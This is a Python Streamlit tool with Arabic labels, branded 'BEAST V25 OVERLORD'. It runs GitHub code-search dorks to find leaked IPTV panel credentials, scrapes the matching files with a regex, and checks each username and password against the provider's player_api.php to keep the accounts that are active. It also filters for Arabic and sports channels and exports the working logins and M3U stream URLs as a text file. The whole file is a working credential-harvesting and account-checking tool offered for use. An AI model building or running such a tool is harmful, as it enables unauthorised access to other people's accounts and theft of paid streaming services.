import streamlit as st
import requests
import re
from datetime import datetime
import concurrent.futures
import time

# =================================================
# 1. إعدادات النظام والتنسيق البصري الاحترافي
# =================================================
st.set_page_config(page_title="BEAST V25 OVERLORD", layout="wide", page_icon="⚔️")

st.markdown("""
<style>
    .stApp { background-color: #05070a; color: #ffffff; }
    .main-header { 
        background: linear-gradient(90deg, #00ff41, #008f25); 
        -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
        font-size: 50px; text-align: center; font-weight: bold; margin-bottom: 20px;
    }
    .card {
        background: #111418; border: 1px solid #1e2329; border-radius: 12px;
        padding: 20px; margin-bottom: 15px; border-top: 4px solid #00ff41;
        transition: 0.3s;
    }
    .card:hover { transform: scale(1.02); border-color: #00ff41; box-shadow: 0 5px 15px rgba(0,255,65,0.2); }
    .status-active { color: #00ff41; font-weight: bold; }
    .channel-tag { background: #0084ff; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-right: 5px; }
    .m3u-area { background: #000; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; color: #00ff41; margin-top: 10px; border: 1px dashed #333; }
</style>
""", unsafe_allow_html=True)

if 'found_data' not in st.session_state: st.session_state.found_data = []
if 'is_running' not in st.session_state: st.session_state.is_running = False
if 'total_scanned' not in st.session_state: st.session_state.total_scanned = 0

# =================================================
# 2. محرك الفحص الذكي (فحص القنوات + الصلاحية)
# =================================================
def scan_server(host, user, pw, target_ch):
    try:
        # فحص الحساب
        api = f"{host}/player_api.php?username={user}&password={pw}"
        res = requests.get(api, timeout=4).json()
        
        if res.get("user_info", {}).get("status") == "Active":
            info = res["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            
            # فحص القنوات (Deep Check)
            cat_api = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories"
            cats = requests.get(cat_api, timeout=3).text.upper()
            
            is_arabic = any(k in cats for k in ["ARABIC", "NILESAT", "MYHD", "EGYPT", "MAGHREB"])
            
            # فلتر القنوات المحددة
            matches_target = True
            if target_ch:
                target_list = [t.strip().upper() for t in target_ch.split(',')]
                matches_target = any(t in cats for t in target_list)

            if matches_target:
                return {
                    "host": host, "user": user, "pass": pw, "exp": exp,
                    "ar": is_arabic, "cats": cats[:200], # حفظ عينة من الفئات
                    "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
                }
    except: return None

# =================================================
# 3. واجهة التحكم (Sidebar)
# =================================================
with st.sidebar:
    st.markdown("<h1 style='color:#00ff41;'>🌪️ BEAST V25</h1>", unsafe_allow_html=True)
    token = st.text_input("GitHub Token:", type="password")
    
    st.divider()
    target_channels = st.text_input("قنوات مستهدفة (مثال: BEIN, SSC):", placeholder="اتركها فارغة لكل العربي")
    search_depth = st.slider("عمق البحث (صفحات):", 1, 100, 20)
    filter_ar = st.checkbox("عرض المحتوى العربي فقط", value=True)
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 هجوم"): st.session_state.is_running = True
    with col2:
        if st.button("🛑 إيقاف"): st.session_state.is_running = False

    st.metric("🔍 فحص", st.session_state.total_scanned)
    st.metric("💎 صيد", len(st.session_state.found_data))

    # --- ميزة تحميل ملف TEXT ---
    if st.session_state.found_data:
        st.divider()
        txt_content = "--- BEAST V25 HUNTER RESULTS ---\n\n"
        for i, item in enumerate(st.session_state.found_data):
            txt_content += f"[{i+1}] HOST: {item['host']}\nUSER: {item['user']} | PASS: {item['pass']}\nEXP: {item['exp']}\nM3U: {item['m3u']}\n" + "-"*30 + "\n"
        
        st.download_button("📥 تحميل نتائج الصيد (TXT)", txt_content, file_name="Beast_Results.txt")

# =================================================
# 4. الرادار وعرض النتائج
# =================================================
st.markdown("<div class='main-header'>BEAST OVERLORD V25</div>", unsafe_allow_html=True)
results_grid = st.container()

def draw_results():
    with results_grid:
        data = st.session_state.found_data
        if filter_ar: data = [i for i in data if i['ar']]
        
        cols = st.columns(2)
        for idx, item in enumerate(data):
            with cols[idx % 2]:
                st.markdown(f"""
                <div class="card">
                    <div style="display:flex; justify-content:space-between;">
                        <span style="color:#00ff41; font-weight:bold; font-size:18px;">{item['host']}</span>
                        {"<span style='background:#ff4b4b; padding:2px 8px; border-radius:4px; font-size:10px;'>ARABIC</span>" if item['ar'] else ""}
                    </div>
                    <div style="margin-top:10px; font-size:14px;">
                        👤 <b>User:</b> {item['user']} | 🔑 <b>Pass:</b> {item['pass']}<br>
                        📅 <b>Expiry:</b> <span style="color:#ffa500;">{item['exp']}</span>
                    </div>
                    <div class="m3u-area">{item['m3u']}</div>
                </div>
                """, unsafe_allow_html=True)

if st.session_state.is_running:
    if not token:
        st.error("⚠️ يرجى إدخال التوكن!")
    else:
        headers = {'Authorization': f'token {token}'}
        # قائمة دوركات ضخمة (Massive Dorks)
        dorks = [
            '"player_api.php" username password BEIN',
            '"get.php?username=" password SSC',
            'filename:iptv.txt ARABIC',
            'extension:m3u "http" SHAHID',
            'filename:beinsports.txt',
            'extension:txt "player_api" OSN',
            'filename:arab.m3u'
        ]

        for dork in dorks:
            if not st.session_state.is_running: break
            for page in range(1, search_depth + 1):
                if not st.session_state.is_running: break
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    r = requests.get(url, headers=headers).json()
                    
                    if 'items' in r:
                        for item in r['items']:
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw_url, timeout=3).text
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                                results = list(executor.map(lambda p: scan_server(*p, target_channels), matches))
                                for res in results:
                                    st.session_state.total_scanned += 1
                                    if res and res not in st.session_state.found_data:
                                        st.session_state.found_data.insert(0, res)
                                        draw_results()
                    elif 'message' in r:
                        st.warning("⚠️ حظر مؤقت من GitHub.. سأنتظر 30 ثانية لتجديد التوكن.")
                        time.sleep(30)
                        break
                except: continue
        st.session_state.is_running = False
else:
    draw_results()
